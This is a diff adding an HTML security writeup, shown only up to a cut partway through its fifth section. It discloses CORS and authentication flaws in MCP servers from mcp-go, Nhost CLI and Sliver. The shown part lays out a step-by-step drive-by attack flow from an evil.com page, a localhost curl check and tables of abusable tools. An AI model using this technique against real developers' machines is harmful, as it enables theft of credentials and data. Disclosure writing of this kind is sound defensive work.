@@ -1,0 +1,1452 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>One Click to Compromise: CORS & Auth Failures in MCP Servers</title>
+  <link rel="icon" href="/assets/images/profile.png">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Syne+Mono&family=Syne:wght@400;600;700;800&family=DM+Serif+Display:ital@0;1&display=swap');
+
+    :root {
+      --bg: #0a0b0c;
+      --surface: #111315;
+      --surface2: #181a1d;
+      --border: #242628;
+      --text: #e2e4e8;
+      --muted: #6b717d;
+      --accent: #ff3c3c;
+      --accent2: #ff8c42;
+      --accent3: #3dffc0;
+      --code-bg: #0d0f10;
+    }
+
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Syne', sans-serif;
+      font-size: 16px;
+      line-height: 1.75;
+      overflow-x: hidden;
+    }
+
+    /* ─── HEADER ─── */
+    header {
+      border-bottom: 1px solid var(--border);
+      padding: 4.5rem 0 3.5rem;
+      position: relative;
+      overflow: hidden;
+      animation: headerFadeIn 0.7s ease forwards;
+    }
+
+    @keyframes headerFadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+
+      to {
+        opacity: 1;
+        transform: none;
+      }
+    }
+
+    /* Subtle scan line that runs once on load */
+    header::after {
+      content: '';
+      position: absolute;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(255, 60, 60, 0.35), transparent);
+      animation: headerScan 1.1s ease forwards 0.3s;
+      top: 0;
+      opacity: 0;
+    }
+
+    @keyframes headerScan {
+      0% {
+        top: 0;
+        opacity: 0.7;
+      }
+
+      100% {
+        top: 100%;
+        opacity: 0;
+      }
+    }
+
+    .hglow {
+      position: absolute;
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    .hglow1 {
+      top: -140px;
+      left: -100px;
+      width: 520px;
+      height: 520px;
+      background: radial-gradient(circle, rgba(255, 60, 60, .055) 0%, transparent 65%);
+      animation: glowDrift 5s ease-in-out infinite;
+    }
+
+    .hglow2 {
+      top: -80px;
+      right: -80px;
+      width: 380px;
+      height: 380px;
+      background: radial-gradient(circle, rgba(255, 140, 66, .04) 0%, transparent 65%);
+      animation: glowDrift 6s ease-in-out infinite reverse;
+    }
+
+    @keyframes glowDrift {
+
+      0%,
+      100% {
+        transform: scale(1) translate(0, 0)
+      }
+
+      50% {
+        transform: scale(1.1) translate(10px, 8px)
+      }
+    }
+
+    .header-inner {
+      max-width: 840px;
+      margin: 0 auto;
+      padding: 0 2rem;
+    }
+
+    .label-row {
+      display: flex;
+      gap: .6rem;
+      margin-bottom: 1.6rem;
+      flex-wrap: wrap;
+      opacity: 0;
+      animation: fadeUp 0.5s ease forwards 0.1s;
+    }
+
+    .tag {
+      font-family: 'Syne Mono', monospace;
+      font-size: .66rem;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+      padding: .25rem .65rem;
+      border-radius: 2px;
+      border: 1px solid;
+    }
+
+    .tag-red {
+      color: var(--accent);
+      border-color: rgba(255, 60, 60, .35);
+      background: rgba(255, 60, 60, .06);
+    }
+
+    .tag-orange {
+      color: var(--accent2);
+      border-color: rgba(255, 140, 66, .35);
+      background: rgba(255, 140, 66, .06);
+    }
+
+    .tag-green {
+      color: var(--accent3);
+      border-color: rgba(61, 255, 192, .35);
+      background: rgba(61, 255, 192, .06);
+    }
+
+    .tag-gray {
+      color: var(--muted);
+      border-color: var(--border);
+    }
+
+    h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: clamp(2rem, 5vw, 3.3rem);
+      font-weight: 400;
+      line-height: 1.12;
+      color: #fff;
+      margin-bottom: 1.3rem;
+      opacity: 0;
+      animation: fadeUp 0.6s ease forwards 0.25s;
+    }
+
+    h1 em {
+      font-style: italic;
+      color: var(--accent);
+    }
+
+    .subtitle {
+      font-size: 1rem;
+      color: var(--muted);
+      max-width: 660px;
+      line-height: 1.72;
+      margin-bottom: 2rem;
+      opacity: 0;
+      animation: fadeUp 0.5s ease forwards 0.4s;
+    }
+
+    .meta {
+      display: flex;
+      gap: 2rem;
+      flex-wrap: wrap;
+      font-family: 'Syne Mono', monospace;
+      font-size: .68rem;
+      color: var(--muted);
+      letter-spacing: .04em;
+      opacity: 0;
+      animation: fadeUp 0.5s ease forwards 0.5s;
+    }
+
+    @keyframes fadeUp {
+      from {
+        opacity: 0;
+        transform: translateY(12px);
+      }
+
+      to {
+        opacity: 1;
+        transform: none;
+      }
+    }
+
+    /* ─── CONTENT ─── */
+    main {
+      max-width: 840px;
+      margin: 0 auto;
+      padding: 3.5rem 2rem 6rem;
+    }
+
+    .reveal {
+      opacity: 0;
+      transform: translateY(22px);
+      transition: opacity .6s ease, transform .6s ease;
+    }
+
+    .reveal.in-view {
+      opacity: 1;
+      transform: none;
+    }
+
+    h2 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 1.75rem;
+      font-weight: 400;
+      color: #fff;
+      margin: 3.5rem 0 1.2rem;
+      padding-bottom: .6rem;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: baseline;
+      gap: .75rem;
+    }
+
+    .sec-num {
+      font-family: 'Syne Mono', monospace;
+      font-size: .7rem;
+      color: var(--accent);
+      letter-spacing: .05em;
+      flex-shrink: 0;
+    }
+
+    h3 {
+      font-family: 'Syne', sans-serif;
+      font-size: .76rem;
+      font-weight: 700;
+      color: #fff;
+      margin: 2rem 0 .75rem;
+      text-transform: uppercase;
+      letter-spacing: .12em;
+    }
+
+    p {
+      margin-bottom: 1.1rem;
+      color: #bcc0c9;
+    }
+
+    a {
+      color: var(--accent3);
+      text-decoration: none;
+      border-bottom: 1px solid rgba(61, 255, 192, .3);
+      transition: border-color .2s;
+    }
+
+    a:hover {
+      border-bottom-color: var(--accent3);
+    }
+
+    strong {
+      color: var(--text);
+      font-weight: 600;
+    }
+
+    /* ─── CVE CARDS ─── */
+    .cve-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+      margin: 2rem 0;
+    }
+
+    @media(max-width:580px) {
+      .cve-grid {
+        grid-template-columns: 1fr
+      }
+    }
+
+    .cve-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1.4rem;
+      position: relative;
+      overflow: hidden;
+      transition: border-color .3s, transform .3s;
+    }
+
+    .cve-card:hover {
+      transform: translateY(-3px);
+    }
+
+    .cve-card.high:hover {
+      border-color: rgba(255, 60, 60, .45);
+    }
+
+    .cve-card.moderate:hover {
+      border-color: rgba(255, 140, 66, .45);
+    }
+
+    .cve-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 2px;
+    }
+
+    .cve-card.high::before {
+      background: var(--accent);
+    }
+
+    .cve-card.moderate::before {
+      background: var(--accent2);
+    }
+
+    .cve-card::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      right: 0;
+      width: 36px;
+      height: 36px;
+      border-right: 1px solid;
+      border-bottom: 1px solid;
+      border-radius: 0 0 6px 0;
+      opacity: .18;
+      transition: opacity .3s, width .3s, height .3s;
+    }
+
+    .cve-card.high::after {
+      border-color: var(--accent);
+    }
+
+    .cve-card.moderate::after {
+      border-color: var(--accent2);
+    }
+
+    .cve-card:hover::after {
+      opacity: .5;
+      width: 56px;
+      height: 56px;
+    }
+
+    .cve-card-id {
+      font-family: 'Syne Mono', monospace;
+      font-size: .7rem;
+      letter-spacing: .05em;
+      margin-bottom: .5rem;
+    }
+
+    .cve-card.high .cve-card-id {
+      color: var(--accent);
+    }
+
+    .cve-card.moderate .cve-card-id {
+      color: var(--accent2);
+    }
+
+    .cve-card-title {
+      font-weight: 700;
+      font-size: .95rem;
+      color: #fff;
+      margin-bottom: .4rem;
+    }
+
+    .cve-card-desc {
+      font-size: .81rem;
+      color: var(--muted);
+      line-height: 1.55;
+    }
+
+    .severity-badge {
+      display: inline-block;
+      margin-top: .8rem;
+      font-family: 'Syne Mono', monospace;
+      font-size: .62rem;
+      text-transform: uppercase;
+      letter-spacing: .08em;
+      padding: .15rem .5rem;
+      border-radius: 2px;
+    }
+
+    .badge-high {
+      background: rgba(255, 60, 60, .15);
+      color: var(--accent);
+    }
+
+    .badge-moderate {
+      background: rgba(255, 140, 66, .15);
+      color: var(--accent2);
+    }
+
+    /* ─── CALLOUTS ─── */
+    .callout {
+      border-left: 3px solid;
+      padding: 1.1rem 1.4rem;
+      border-radius: 0 4px 4px 0;
+      margin: 1.8rem 0;
+      font-size: .93rem;
+    }
+
+    .callout-red {
+      border-color: var(--accent);
+      background: rgba(255, 60, 60, .04);
+    }
+
+    .callout-orange {
+      border-color: var(--accent2);
+      background: rgba(255, 140, 66, .04);
+    }
+
+    .callout-green {
+      border-color: var(--accent3);
+      background: rgba(61, 255, 192, .04);
+    }
+
+    .callout-gray {
+      border-color: var(--border);
+      background: var(--surface);
+    }
+
+    .callout-label {
+      font-family: 'Syne Mono', monospace;
+      font-size: .64rem;
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      margin-bottom: .5rem;
+      opacity: .65;
+    }
+
+    /* ─── CODE ─── */
+    pre,
+    code {
+      font-family: 'Syne Mono', monospace;
+      font-size: .82rem;
+    }
+
+    code {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      padding: .1rem .4rem;
+      border-radius: 3px;
+      color: var(--accent3);
+    }
+
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1.5rem 1.8rem;
+      overflow-x: auto;
+      margin: 1.5rem 0;
+      line-height: 1.7;
+      position: relative;
+    }
+
+    pre::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, var(--accent), transparent);
+      opacity: .4;
+    }
+
+    pre code {
+      background: none;
+      border: none;
+      padding: 0;
+      color: #c2c6cf;
+    }
+
+    .code-label {
+      font-family: 'Syne Mono', monospace;
+      font-size: .62rem;
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      color: var(--muted);
+      margin-bottom: .4rem;
+      display: block;
+    }
+
+    .hl-red {
+      color: var(--accent);
+    }
+
+    .hl-green {
+      color: var(--accent3);
+    }
+
+    .hl-orange {
+      color: var(--accent2);
+    }
+
+    .hl-comment {
+      color: #3e4550;
+    }
+
+    /* ─── FLOW ─── */
+    .flow {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1.8rem 2rem;
+      margin: 2rem 0;
+      font-family: 'Syne Mono', monospace;
+      font-size: .78rem;
+    }
+
+    .flow-step {
+      display: flex;
+      align-items: flex-start;
+      gap: 1rem;
+      padding: .5rem 0;
+    }
+
+    .flow-num {
+      color: var(--accent);
+      flex-shrink: 0;
+      width: 1.4rem;
+      text-align: right;
+    }
+
+    .flow-text {
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    .flow-arrow {
+      padding: 0 0 0 2.4rem;
+      color: #2a2d32;
+    }
+
+    /* ─── TABLE ─── */
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: .87rem;
+      margin: 1.5rem 0;
+    }
+
+    th {
+      font-family: 'Syne Mono', monospace;
+      font-size: .64rem;
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      color: var(--muted);
+      border-bottom: 1px solid var(--border);
+      padding: .6rem 1rem;
+      text-align: left;
+    }
+
+    td {
+      padding: .75rem 1rem;
+      border-bottom: 1px solid rgba(36, 38, 40, .8);
+      color: #bcc0c9;
+      vertical-align: top;
+      transition: background .15s;
+    }
+
+    tr:hover td {
+      background: rgba(255, 255, 255, .012);
+    }
+
+    tr:last-child td {
+      border-bottom: none;
+    }
+
+    /* ─── BLOCKQUOTE ─── */
+    blockquote {
+      border-left: 3px solid var(--border);
+      margin: 1.8rem 0;
+      padding: .8rem 1.4rem;
+      font-style: italic;
+      color: var(--muted);
+      font-family: 'DM Serif Display', serif;
+      font-size: 1.05rem;
+      line-height: 1.7;
+    }
+
+    blockquote cite {
+      display: block;
+      font-family: 'Syne Mono', monospace;
+      font-size: .66rem;
+      font-style: normal;
+      margin-top: .6rem;
+      color: #3d4048;
+      letter-spacing: .04em;
+    }
+
+    /* ─── SCENARIOS ─── */
+    .scenario-block {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1.4rem 1.6rem;
+      margin-bottom: .8rem;
+      transition: border-color .25s, transform .25s;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .scenario-block::before {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      width: 0;
+      background: rgba(255, 60, 60, .055);
+      transition: width .3s ease;
+    }
+
+    .scenario-block:hover {
+      border-color: rgba(255, 60, 60, .3);
+      transform: translateX(4px);
+    }
+
+    .scenario-block:hover::before {
+      width: 100%;
+    }
+
+    .scenario-label {
+      font-family: 'Syne Mono', monospace;
+      font-size: .63rem;
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      color: var(--accent);
+      margin-bottom: .4rem;
+      position: relative;
+    }
+
+    .scenario-title {
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: .4rem;
+      font-size: .93rem;
+      position: relative;
+    }
+
+    .scenario-block p {
+      position: relative;
+    }
+
+    /* ─── TERMINAL ─── */
+    .terminal {
+      background: #000;
+      border: 1px solid #1c1c1c;
+      border-radius: 6px;
+      overflow: hidden;
+      margin: 1.5rem 0;
+    }
+
+    .terminal-bar {
+      background: #111;
+      padding: .5rem .75rem;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      border-bottom: 1px solid #1c1c1c;
+    }
+
+    .td-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+
+    .td-red {
+      background: #ff5f57;
+    }
+
+    .td-yellow {
+      background: #ffbd2e;
+    }
+
+    .td-green {
+      background: #28ca42;
+    }
+
+    .terminal-body {
+      padding: 1.2rem 1.5rem;
+      font-family: 'Syne Mono', monospace;
+      font-size: .8rem;
+      line-height: 1.7;
+      color: #7a818c;
+    }
+
+    /* ─── CURSOR ─── */
+    .cursor {
+      display: inline-block;
+      width: 2px;
+      height: .9em;
+      background: var(--accent);
+      margin-left: 2px;
+      animation: cursorBlink 1s step-end infinite;
+      vertical-align: middle;
+    }
+
+    @keyframes cursorBlink {
+
+      0%,
+      100% {
+        opacity: 1
+      }
+
+      50% {
+        opacity: 0
+      }
+    }
+
+    /* ─── NAV DOTS ─── */
+    .nav-dots {
+      position: fixed;
+      right: 1.5rem;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .nav-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--border);
+      transition: background .3s, transform .3s;
+      cursor: pointer;
+    }
+
+    .nav-dot.active {
+      background: var(--accent);
+      transform: scale(1.6);
+    }
+
+    @media(max-width:768px) {
+      .nav-dots {
+        display: none
+      }
+    }
+
+    /* ─── HR / LISTS ─── */
+    hr {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 3rem 0;
+    }
+
+    ul,
+    ol {
+      padding-left: 1.4rem;
+      margin-bottom: 1.1rem;
+      color: #bcc0c9;
+    }
+
+    li {
+      margin-bottom: .4rem;
+    }
+
+    /* ─── TOC ─── */
+    .toc {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1.4rem 1.6rem;
+      margin: 2rem 0 3rem;
+    }
+
+    .toc-title {
+      font-family: 'Syne Mono', monospace;
+      font-size: .64rem;
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      color: var(--muted);
+      margin-bottom: 1rem;
+    }
+
+    .toc ol {
+      margin: 0;
+      padding-left: 1.2rem;
+    }
+
+    .toc li {
+      margin-bottom: .28rem;
+    }
+
+    .toc a {
+      color: var(--text);
+      border-bottom-color: transparent;
+      font-size: .875rem;
+    }
+
+    .toc a:hover {
+      color: var(--accent3);
+    }
+
+    /* ─── FOOTER ─── */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 2.5rem 0;
+      text-align: center;
+      font-family: 'Syne Mono', monospace;
+      font-size: .68rem;
+      color: var(--muted);
+      letter-spacing: .04em;
+    }
+
+    /* ─── READ MORE ─── */
+    .read-more {
+      margin-top: 6rem;
+    }
+
+    .read-more h3 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 1.4rem;
+      text-transform: none;
+      letter-spacing: normal;
+      color: #fff;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 1rem;
+      margin-bottom: 2.5rem;
+    }
+
+    .read-more .cve-card {
+      cursor: pointer;
+      height: 100%;
+    }
+
+    .read-more a {
+      color: inherit;
+      border-bottom: none;
+      display: block;
+    }
+  </style>
+  <script type="text/javascript">
+    (function (c, l, a, r, i, t, y) {
+      c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+      t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+      y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "v51vvne904");
+  </script>
+</head>
+
+<body>
+
+  <!-- NAV DOTS -->
+  <nav class="nav-dots" id="navDots">
+    <div class="nav-dot active" title="Background"></div>
+    <div class="nav-dot" title="Root Cause"></div>
+    <div class="nav-dot" title="Bypass"></div>
+    <div class="nav-dot" title="Nhost"></div>
+    <div class="nav-dot" title="Sliver"></div>
+    <div class="nav-dot" title="Comparison"></div>
+    <div class="nav-dot" title="Scenarios"></div>
+    <div class="nav-dot" title="PoC"></div>
+    <div class="nav-dot" title="Remediation"></div>
+    <div class="nav-dot" title="Broader"></div>
+  </nav>
+
+  <header>
+    <div class="hglow hglow1"></div>
+    <div class="hglow hglow2"></div>
+    <div class="header-inner">
+      <a href="/writeups"
+        style="color: var(--muted); font-family: 'Syne Mono', monospace; font-size: 0.73rem; text-decoration: none; margin-bottom: 2.2rem; display: inline-flex; align-items: center; gap: 0.5rem; opacity: 0.7; transition: all 0.25s; border: none; cursor: pointer;"
+        onmouseover="this.style.opacity='1'; this.style.transform='translateX(-4px)'"
+        onmouseout="this.style.opacity='0.7'; this.style.transform='none'">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+          stroke-linecap="round" stroke-linejoin="round">
+          <line x1="19" y1="12" x2="5" y2="12"></line>
+          <polyline points="12 19 5 12 12 5"></polyline>
+        </svg>
+        Writeups
+      </a>
+      <div class="label-row">
+        <span class="tag tag-red">MCP Chain Research</span>
+        <span class="tag tag-orange">CVE-2026-34200</span>
+        <span class="tag tag-orange">CVE-2026-34227</span>
+        <span class="tag tag-green">Coordinated Disclosure</span>
+      </div>
+      <h1>One Click to Compromise:<br><em>CORS &amp; Auth Failures</em> in MCP Servers</h1>
+      <p class="subtitle">A pattern of missing inbound authentication and permissive cross-origin policies in MCP server
+        implementations, traced to a shared root cause in the mcp-go library - affecting Nhost CLI and the Sliver C2
+        framework.</p>
+      <div class="meta">
+        <span>March 2026</span>
+        <span>Security Research</span>
+        <span>mcp-go · Nhost · Sliver</span>
+      </div>
+    </div>
+  </header>
+
+  <main>
+
+    <div class="toc reveal">
+      <div class="toc-title">Contents</div>
+      <ol>
+        <li><a href="#s1">Background</a></li>
+        <li><a href="#s2">The Root Cause: mcp-go's SSE Handler</a></li>
+        <li><a href="#s3">The Content-Type Bypass</a></li>
+        <li><a href="#s4">Finding 1 - Nhost CLI (CVE-2026-34200)</a></li>
+        <li><a href="#s5">Finding 2 - Sliver C2 Framework (CVE-2026-34227)</a></li>
+        <li><a href="#s6">Side-by-Side Comparison</a></li>
+        <li><a href="#s7">Attack Scenarios</a></li>
+        <li><a href="#s8">Proof of Concept</a></li>
+        <li><a href="#s9">Remediation &amp; Vendor Response</a></li>
+        <li><a href="#s10">The Broader MCP Security Problem</a></li>
+      </ol>
+    </div>
+
+    <!-- 01 -->
+    <div id="s1">
+      <h2 class="reveal"><span class="sec-num">01</span> Background</h2>
+      <p class="reveal">The Model Context Protocol (MCP) is an emerging standard that allows AI assistants to call tools
+        through a structured interface. As adoption has grown rapidly across developer tooling, security teams have not
+        yet established consistent threat models for MCP server deployments - particularly around locally-running
+        instances.</p>
+      <p class="reveal">During research in March 2026, I identified the same class of vulnerability independently in two
+        products: <strong>Nhost CLI</strong> and the <strong>Sliver C2 framework</strong>. Both expose MCP servers over
+        HTTP. Both return <code>Access-Control-Allow-Origin: *</code> on every response. Neither requires inbound
+        authentication. The result in both cases is the same: a single malicious web page, visited in a browser on the
+        same machine as the developer, can silently invoke privileged MCP tools using the developer's own configured
+        credentials.</p>
+      <div class="cve-grid reveal">
+        <div class="cve-card high">
+          <div class="cve-card-id">CVE-2026-34200 · GHSA-6c5x-3h35-vvw2</div>
+          <div class="cve-card-title">Nhost CLI MCP Server</div>
+          <div class="cve-card-desc">Missing inbound auth on explicitly bound network port. Drive-by access to GraphQL
+            endpoints and raw SQL execution against cloud projects.</div>
+          <span class="severity-badge badge-high">High</span>
+        </div>
+        <div class="cve-card high">
+          <div class="cve-card-id">CVE-2026-34227 · GHSA-6fpf-248c-m7wm</div>
+          <div class="cve-card-title">Sliver C2 Framework</div>
+          <div class="cve-card-desc">Unauthenticated MCP interface bound to localhost by default. Full control over
+            active C2 sessions - list, read, and delete files on compromised targets.</div>
+          <span class="severity-badge badge-high">High</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- 02 -->
+    <div id="s2">
+      <h2 class="reveal"><span class="sec-num">02</span> The Root Cause: mcp-go's SSE Handler</h2>
+      <p class="reveal">Both vulnerabilities trace back to the same upstream library: <a
+          href="https://github.com/mark3labs/mcp-go" target="_blank">mcp-go</a>, a popular Go library for building MCP
+        servers. Specifically, the issue lives in its <strong>SSEServer</strong> implementation.</p>
+      <p class="reveal">The SSEServer hardcodes a permissive CORS policy on every response from the SSE and message
+        endpoints:</p>
+      <div class="reveal">
+        <span class="code-label">github.com/mark3labs/mcp-go - server/sse.go (line ~420)</span>
+        <pre><code><span class="hl-comment">// Hardcoded on SSE and message handlers</span>
+w.Header().Set(<span class="hl-green">"Access-Control-Allow-Origin"</span>, <span class="hl-red">"*"</span>)
+w.Header().Set(<span class="hl-green">"Access-Control-Allow-Methods"</span>, <span class="hl-red">"GET, POST, OPTIONS"</span>)
+w.Header().Set(<span class="hl-green">"Access-Control-Allow-Headers"</span>, <span class="hl-red">"Content-Type"</span>)</code></pre>
+      </div>
+      <div class="callout callout-orange reveal">
+        <div class="callout-label">⚠ Odd Design Choice</div>
+        <p style="margin:0;">Honestly, the implementation in mcp-go is pretty weird. The permissive CORS is applied
+          <em>only</em> on the SSE handler - the standard HTTP handler in the same library is perfectly fine. This
+          asymmetry is puzzling and suggests the SSE transport was added without a full security review. Someone even
+          raised origin validation as a feature request via <a href="https://github.com/mark3labs/mcp-go/issues/475"
+            target="_blank">mark3labs/mcp-go#475</a>, and they closed it as <strong>not planned</strong>.
+        </p>
+      </div>
+      <p class="reveal">This means any website can open an <code>EventSource</code> connection to
+        <code>http://localhost:PORT/sse</code> from a browser - the server responds with no preflight required for SSE.
+      </p>
+    </div>
+
+    <!-- 03 -->
+    <div id="s3">
+      <h2 class="reveal"><span class="sec-num">03</span> The Content-Type Bypass</h2>
+      <p class="reveal">Even setting SSE aside, there is a second and more reliable attack vector: <strong>CORS Simple
+          Requests</strong>.</p>
+      <p class="reveal">Browsers only trigger a CORS preflight (<code>OPTIONS</code> request) when certain conditions
+        are met - a non-simple <code>Content-Type</code>, a non-standard method, or custom headers. The mcp-go server
+        does not strictly validate the <code>Content-Type</code> header on inbound JSON-RPC requests. This means an
+        attacker can send a POST with <code>Content-Type: text/plain</code> - a Simple Request - and the browser
+        dispatches it cross-origin <em>without ever sending a preflight</em>.</p>
+      <div class="flow reveal">
+        <div class="flow-step"><span class="flow-num">1</span><span class="flow-text">Attacker hosts page on
+            <code>evil.com</code> - victim visits it in browser on developer machine</span></div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step"><span class="flow-num">2</span><span class="flow-text">Browser opens
+            <code>EventSource</code> to <code>localhost:8080/sse</code> - permissive CORS allows it</span></div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step"><span class="flow-num">3</span><span class="flow-text">Server returns
+            <code>sessionId</code> endpoint URL via SSE stream</span></div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step"><span class="flow-num">4</span><span class="flow-text">Attacker POSTs JSON-RPC payload
+            with <code>Content-Type: text/plain</code> - no preflight fired</span></div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step"><span class="flow-num">5</span><span class="flow-text">Server executes tool call using
+            developer's locally configured credentials</span></div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step"><span class="flow-num">6</span><span class="flow-text">Result arrives over SSE stream -
+            attacker reads it cross-origin</span></div>
+      </div>
+      <p class="reveal">This technique is highly reliable across all modern browsers. It requires no special conditions,
+        no browser plugins, and no user interaction beyond visiting the malicious page.</p>
+    </div>
+
+    <!-- 04 -->
+    <div id="s4">
+      <h2 class="reveal"><span class="sec-num">04</span> Finding 1 - Nhost CLI (CVE-2026-34200)</h2>
+      <h3 class="reveal">What is Nhost?</h3>
+      <p class="reveal">Nhost is an open-source Firebase alternative providing GraphQL APIs, authentication, and
+        storage. Its CLI includes an MCP server allowing AI assistants to manage local and cloud Nhost projects.</p>
+      <h3 class="reveal">Preconditions</h3>
+      <p class="reveal">This vulnerability requires two explicit, non-default configuration steps. The default
+        <code>nhost mcp start</code> is <strong>not affected</strong> - it binds to stdio, opening no network socket at
+        all.
+      </p>
+      <div class="callout callout-gray reveal">
+        <div class="callout-label">Required Configuration - Both Needed</div>
+        <strong>1. Explicit network binding:</strong><br>
+        <code>nhost mcp start --bind localhost:8080</code><br><br>
+        <strong>2. Cloud credentials configured:</strong><br>
+        <code>nhost login &amp;&amp; nhost mcp config</code>
+      </div>
+      <p class="reveal">Without the <code>--bind</code> flag, no network socket is opened and no browser-based attack is
+        possible. Without cloud credentials, an attacker reaching the server is limited to the local development
+        environment.</p>
+      <h3 class="reveal">Exposed Tools</h3>
+      <div class="reveal">
+        <table>
+          <thead>
+            <tr>
+              <th>Tool</th>
+              <th>Requires Cloud Config</th>
+              <th>Impact</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>graphql-query</code></td>
+              <td>No</td>
+              <td>Read/write GraphQL access with admin role; arbitrary X-Hasura-Role/User-Id headers</td>
+            </tr>
+            <tr>
+              <td><code>cloud-graphql-query</code></td>
+              <td>Yes</td>
+              <td>Queries and mutations against cloud project using developer's PAT</td>
+            </tr>
+            <tr>
+              <td><code>manage-graphql</code></td>
+              <td>Yes</td>
+              <td>Access to <code>/apis/migrate</code> - raw SQL execution, table drops, permission changes</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <h3 class="reveal">Confirming the Exposure</h3>
+      <div class="reveal">
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="td-dot td-red"></div>
+            <div class="td-dot td-yellow"></div>
+            <div class="td-dot td-green"></div>
+          </div>
+          <div class="terminal-body">
+            <span style="color:#424850">$ curl localhost:8080/sse -i</span><br><br>
+            HTTP/1.1 200 OK<br>
+            <span class="hl-red">Access-Control-Allow-Origin: *</span><br>
+            Content-Type: text/event-stream<br>
+            ...<br><br>
+            event: endpoint<br>
+            data: /message?sessionId=6b909af2-70fa-4aa2-a726-0559f049f8aa<span class="cursor"></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 05 -->
+    <div id="s5">
+      <h2 class="reveal"><span class="sec-num">05</span> Finding 2 - Sliver C2 Framework (CVE-2026-34227)</h2>
+      <h3 class="reveal">What is Sliver?</h3>
+      <p class="reveal">Sliver is an open-source adversary simulation framework developed by BishopFox. It provides a C2
+        (command-and-control) platform for red team operations. Its MCP server exposes tools for managing live implants
+        - sessions and beacons running on target machines.</p>
+      <h3 class="reveal">Why This Is Particularly Severe</h3>
+      <p class="reveal">Unlike Nhost - where network binding is opt-in - <strong>Sliver's MCP server binds to
+          <code>localhost:8080</code> by default</strong> when MCP is enabled. No explicit flag required. Every operator
+        who enables MCP is exposed.</p>
+      <div class="callout callout-red reveal">
+        <div class="callout-label">🔺 Escalation Path</div>
+        If an operator misconfigures the interface to bind on <code>0.0.0.0</code> for team access, the vulnerability
+        escalates from a browser-based CSRF/CORS issue to <strong>direct unauthenticated remote access</strong> from
+        anywhere on the network - no browser required, no victim interaction at all.
+      </div>
+      <h3 class="reveal">Exposed Tools</h3>
+      <div class="reveal">
+        <table>
+          <thead>
+            <tr>
+              <th>Tool</th>
+              <th>Impact</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>list_sessions_and_beacons</code></td>
+              <td>Full visibility into active implants, targets, and infrastructure</td>
+            </tr>
+            <tr>
+              <td><code>fs_ls</code>, <code>fs_pwd</code>, <code>fs_cd</code></td>
+              <td>Browse file systems on compromised targets</td>
+            </tr>
+            <tr>
+              <td><code>fs_cat</code></td>
+              <td>Exfiltrate arbitrary files - SSH keys, <code>ntds.dit</code>, credentials</td>
+            </tr>
+            <tr>
+              <td><code>fs_rm</code>, <code>fs_mv</code>, <code>fs_cp</code>, <code>fs_mkdir</code></td>
+              <td>Destroy or manipulate files on targets - campaign sabotage</td>
+            </tr>
+            <tr>
+              <td><code>fs_chmod</code>, <code>fs_chown</code></td>
+              <td>Alter permissions on compromised hosts</td>
